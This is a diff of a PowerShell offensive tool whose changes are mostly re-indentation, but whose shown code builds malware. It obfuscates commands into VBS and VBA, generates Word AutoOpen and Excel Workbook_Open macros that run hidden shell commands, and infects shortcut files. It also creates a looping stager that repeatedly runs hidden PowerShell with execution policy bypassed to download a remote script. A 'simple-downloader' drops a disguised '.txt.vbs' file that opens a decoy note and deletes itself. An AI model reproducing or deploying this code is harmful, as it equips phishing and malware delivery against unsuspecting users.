@@ -245,7 +245,7 @@ function obfuscate-cmdstring($cmdstring, $sType, $vbaType) {
     	#[->] Obfuscate command string for wscript shell
     	$cmdstrArray = @()
     	[int]$ccnt = '1'
-		$cmdfile = $newline	
+	$cmdfile = $newline	
 	
     	foreach ( $char in $cmdstring.GetEnumerator() ) 
 	{
@@ -270,16 +270,15 @@ function obfuscate-cmdstring($cmdstring, $sType, $vbaType) {
 			$cmdfile += ' &chr(' + $hval + '+' + $hval + '+' + $rnum + ')'
 		
 		}
-		
-		#[->] create random legnth of char use
+			#[->] create random legnth of char use
 			$randval = get-random -max 12 -min 1
+			
         	if ( $randval -eq '8' ) { $cmdfile += $newline; [int]$ccnt = 0 }
        		$ccnt++	
 
 	}
 	
     	#[->] concatinate vars to single command string
-
     	[int]$cnt = 1
     	foreach ( $randvar in $cmdstrArray )
 	{
@@ -298,25 +297,25 @@ function obfuscate-cmdstring($cmdstring, $sType, $vbaType) {
 	
 	if ( $sType -eq 'vbs' ) 
 	{
-       	#[->] set variables for template generation
-       	$vbsCode = $newline
+       		#[->] set variables for template generation
+       		$vbsCode = $newline
 
-       	#[->] initialize first function in vbs script
-       	$randfunc = rand-str
-       	$vbsCode += 'Function ' + $randfunc + '() ' + $newline
+       		#[->] initialize first function in vbs script
+       		$randfunc = rand-str
+       		$vbsCode += 'Function ' + $randfunc + '() ' + $newline
 
 		#[->] Insert obfuscated command string.
-       	$vbsCode += $cmdfile
+       		$vbsCode += $cmdfile
 
-       	#[->] initalize file system object
-       	$fso = rand-str
-       	$vbsCode += $newline
-       	$vbsCode += 'set ' + $fso + ' = ' + 'createObject("wscript.shell")' + $newline
-       	$vbsCode += $fso + '.run ' + $mainRvar + ',' + ' 0, ' + 'false' + $newline
-       	$vbsCode += 'End Function' + $newline
-       	$vbsCode += $randfunc
+       		#[->] initalize file system object
+       		$fso = rand-str
+       		$vbsCode += $newline
+       		$vbsCode += 'set ' + $fso + ' = ' + 'createObject("wscript.shell")' + $newline
+       		$vbsCode += $fso + '.run ' + $mainRvar + ',' + ' 0, ' + 'false' + $newline
+       		$vbsCode += 'End Function' + $newline
+       		$vbsCode += $randfunc
 	
-       	#[->] vbs script in "vbsCode" is ready to be written to disk
+       		#[->] vbs script in "vbsCode" is ready to be written to disk
 
 		return $vbsCode
 		
@@ -326,32 +325,32 @@ function obfuscate-cmdstring($cmdstring, $sType, $vbaType) {
 	{
 
 		#[->] set variables for template generation
-       	$newline = "`r`n"
-       	$vbaCode = $newline
+       		$newline = "`r`n"
+       		$vbaCode = $newline
 
-       	#[->] initialize first function in vbs script
-       	$randfunc = rand-str
-       	$vbaCode += 'Sub ' + $randfunc + '() ' + $newline
+       		#[->] initialize first function in vbs script
+       		$randfunc = rand-str
+       		$vbaCode += 'Sub ' + $randfunc + '() ' + $newline
 
 		#[->] Insert obfuscated command string.
-       	$vbaCode += $cmdfile
+       		$vbaCode += $cmdfile
 
 		#[->] initalize file system object
-        $fso = rand-str
-       	$vbaCode += $newline
+        	$fso = rand-str
+       		$vbaCode += $newline
 		$vbaCode += 'set ' + $fso + ' = ' + 'createObject("wscript.shell")' + $newline
-        $vbaCode += $fso + '.run ' + $mainRvar + ',' + ' 0, ' + 'false' + $newline
-        $vbaCode += 'End Sub' + $newline
+        	$vbaCode += $fso + '.run ' + $mainRvar + ',' + ' 0, ' + 'false' + $newline
+        	$vbaCode += 'End Sub' + $newline
 
-      	#[->] Set different syntax based upon macro type word vs execl
-        if ( $vbaType -eq "word" ) { $vbaCode += "Sub AutoOpen(): " + $randfunc + ": End Sub" }
-        if ( $vbaType -eq "excel" ) { $vbaCode += "Sub Workbook_Open(): " + $randfunc + ": End Sub" }
+      		#[->] Set different syntax based upon macro type word vs execl
+        	if ( $vbaType -eq "word" ) { $vbaCode += "Sub AutoOpen(): " + $randfunc + ": End Sub" }
+        	if ( $vbaType -eq "excel" ) { $vbaCode += "Sub Workbook_Open(): " + $randfunc + ": End Sub" }
 
 		#[->] vba script is ready
 
-        return $vbaCode
+        	return $vbaCode
 
-    }
+    	}
 
 } # end obfuscate-cmdstring
 
@@ -363,8 +362,8 @@ function shortcut-infect($shortcutFullname, $scriptUrl) {
 	if ( $scriptUrl -match 'http://' -Or $scriptUrl -match 'https://' ) 
 	{ 
 
-        #[->] suppress error messages, makes debugging less annoying
-        #[->] uncomment the code inside catch for more uniform error msg
+        	#[->] suppress error messages, makes debugging less annoying
+        	#[->] uncomment the code inside catch for more uniform error msg
 		
 		try { 
 
@@ -375,8 +374,8 @@ function shortcut-infect($shortcutFullname, $scriptUrl) {
 			
 			$msg = "[!] cannot write to file!"
 			return $msg
-            #Write-Warning "Something went wrong!"
-            #Write-Error $_
+            		#Write-Warning "Something went wrong!"
+            		#Write-Error $_
 
 		}
 
@@ -453,7 +452,7 @@ function shortcut-infect($shortcutFullname, $scriptUrl) {
 function looping-stager($scriptUrl) {
 
 	if ( $scriptUrl -match 'http://' -Or $scriptUrl -match 'https://' )
-    {
+	{
 
 		#[->] prep command download string to be passed to obfuscation engine
 		$cmds = 'while(1){try{ powershell -noni -w hidden -exec bypass -c '
@@ -465,12 +464,12 @@ function looping-stager($scriptUrl) {
 	
 		return $cmdstring
 
-    } else {
+    	} else {
 
-        write-output "[!] FAilED!`n[!]You need to use a proper URL"
-        write-output "format ex: http://ex_domain.com/script or https://ex_domain.com/script"
+        	write-output "[!] FAilED!`n[!]You need to use a proper URL"
+        	write-output "format ex: http://ex_domain.com/script or https://ex_domain.com/script"
 		
-    }
+    	}
 
 }
 
@@ -478,7 +477,7 @@ function looping-stager($scriptUrl) {
 function gen-shortcut($scriptUrl) {
 
 	if ( $scriptUrl -match 'http://' -Or $scriptUrl -match 'https://' )
-    {
+    	{
 
 		#[->] prep command download string to be passed to obfuscation engine
 		$cmds = 'while(1){try{ powershell -noni -w hidden -exec bypass -c '
@@ -499,11 +498,11 @@ function gen-shortcut($scriptUrl) {
 		
 		write-output "[+] Genrated lnk file to current working directory."
 
-    } else {
+    	} else {
 	
 		write-output "[!] Failed!`n[!]You need to use a proper URL"
-        write-output "format ex: http://ex_domain.com/script or https://ex_domain.com/script"
-    
+        	write-output "format ex: http://ex_domain.com/script or https://ex_domain.com/script"
+
 	}
 
 }
@@ -511,57 +510,57 @@ function gen-shortcut($scriptUrl) {
 #[->] Generates a simple vbs downloader.
 function simple-downloader($scriptUrl) {
 
-    if ($scriptUrl)
-    {
+	if ($scriptUrl)
+    	{
 		if ( $scriptUrl -match 'http://' -Or $scriptUrl -match 'https://' )
-        {
+        	{
 		
-            #[->] insure cmd string is working or not before intensive debugging
-            $cmdstring = looping-stager $scriptUrl
+       			#[->] insure cmd string is working or not before intensive debugging
+            		$cmdstring = looping-stager $scriptUrl
 
-            #[->] create vbs script then change attribute to hidden
-            $saveDir = $pwd.Path + '\'
+            		#[->] create vbs script then change attribute to hidden
+            		$saveDir = $pwd.Path + '\'
 
 			#[->] insure cmd string is working or not before intensive debugging
-            $vbsCode = obfuscate-cmdstring $cmdstring 'vbs'
+            		$vbsCode = obfuscate-cmdstring $cmdstring 'vbs'
 
-            $rand = rand-str
-            $vbsName = 'contact-' + $rand + '.txt.vbs'
-            $noteName = 'contact-' + $rand + '.txt'
-            $notePath = $saveDir + $noteName
-            $vbspath = $saveDir + $vbsName
+            		$rand = rand-str
+            		$vbsName = 'contact-' + $rand + '.txt.vbs'
+            		$noteName = 'contact-' + $rand + '.txt'
+            		$notePath = $saveDir + $noteName
+            		$vbspath = $saveDir + $vbsName
 
-            #[->] cmd string to generate txt file
-            $NPcmdstring = 'cmd /c echo johndoe@yahoo.com > ' + $notePath + ' && notepad ' + $noteName
+            		#[->] cmd string to generate txt file
+            		$NPcmdstring = 'cmd /c echo johndoe@yahoo.com > ' + $notePath + ' && notepad ' + $noteName
 			$vbsCode += "`r`n"
-            $vbsCode += obfuscate-cmdstring $NPcmdstring 'vbs'
+            		$vbsCode += obfuscate-cmdstring $NPcmdstring 'vbs'
 			
 			#[->] get vbs code to self-destruct
-            $randFso = rand-str
-            $vbsCode += "`r`n"
-            $vbsCode += 'set ' +  $randFso + ' = ' + 'CreateObject("Scripting.FileSystemObject")' + "`r`n"
-            $vbsCode += $randFso + '.DeleteFile Wscript.ScriptFullName'
+            		$randFso = rand-str
+            		$vbsCode += "`r`n"
+            		$vbsCode += 'set ' +  $randFso + ' = ' + 'CreateObject("Scripting.FileSystemObject")' + "`r`n"
+            		$vbsCode += $randFso + '.DeleteFile Wscript.ScriptFullName'
 
-            set-content $vbspath $vbsCode -Encoding ASCII
-            write-output "[+] finished generating obfuscated looping stager."
+            		set-content $vbspath $vbsCode -Encoding ASCII
+            		write-output "[+] finished generating obfuscated looping stager."
 
-        } else {
+        	} else {
 
-            write-output "[!] FAilED!`n[!]You need to use a proper URL"
-            write-output "format ex: http://ex_domain.com/script or https://ex_domain.com/script"
+            		write-output "[!] FAilED!`n[!]You need to use a proper URL"
+            		write-output "format ex: http://ex_domain.com/script or https://ex_domain.com/script"
 		
-        }
+        	}
 
-    } else {
+	} else {
 
-        $usage =  "`n" + '[=>] Ex: RSH => C:\> simple-downloader "https://your-domain.com/ps-script"' + "`n"
-        $usage += '[=>] drops an obfuscated vbs script to the current working folder.' + "`n"
-        $usage += '[=>] Insure that the script to be downloaded is self contained and' + "`n"
-        $usage += '[=>] does not need additional parameters for the C2 ip/port etc...' + "`n"
+        	$usage =  "`n" + '[=>] Ex: RSH => C:\> simple-downloader "https://your-domain.com/ps-script"' + "`n"
+        	$usage += '[=>] drops an obfuscated vbs script to the current working folder.' + "`n"
+        	$usage += '[=>] Insure that the script to be downloaded is self contained and' + "`n"
+        	$usage += '[=>] does not need additional parameters for the C2 ip/port etc...' + "`n"
 
-        write-output $usage
+        	write-output $usage
 
-    }
+    	}
 
 }
 
@@ -691,7 +690,7 @@ function de-obfuscate ( $filePath, $key ) {
 		{
 
 			$fileString = get-content $filePath | Out-String
-            $action = 'clear'
+            		$action = 'clear'
 
 			$obfuscated = obfuscate-base64 ( $action, $key, $fileString )
 			$obfuscated > 'New-File.txt'
